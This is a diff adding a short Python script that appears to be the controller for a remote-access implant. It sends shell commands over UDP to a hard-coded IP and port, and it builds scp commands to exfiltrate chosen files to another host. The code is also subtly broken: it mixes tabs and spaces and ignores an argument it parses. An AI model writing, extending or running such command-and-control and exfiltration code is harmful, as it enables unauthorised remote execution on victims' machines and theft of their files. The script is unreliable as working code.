@@ -1,0 +1,31 @@
+#!/usr/bin/python
+import sys, socket
+
+commands = ['execute', 'exfil']
+
+if len(sys.argv) <2:
+    print("USAGE: " + sys.argv[0] + " " + str(commands))
+
+def execute(command):
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	sock.sendto((command), ('192.168.43.84', 5050))
+
+def exfiltrate(filepath):
+	command = 'scp ' + filepath + " snag@127.0.0.1:~/milo"
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	sock.sendto((command) ,('192.168.43.84', 5050))
+
+if sys.argv[1] in commands:
+    instruction = sys.argv[1]
+    if instruction == 'execute':
+        shellCom = sys.argv[2]
+        for x in range(3, len(sys.argv)):
+            shellCom = shellCom + " " + sys.argv[x]
+        execute(shellCom)
+	if instruction == 'exfil':
+		ip = sys.argv[2]
+		filepath = sys.argv[3]
+		exfiltrate(filepath)
+
+else:
+    print("USAGE: " + sys.argv[0] + " " + str(commands))
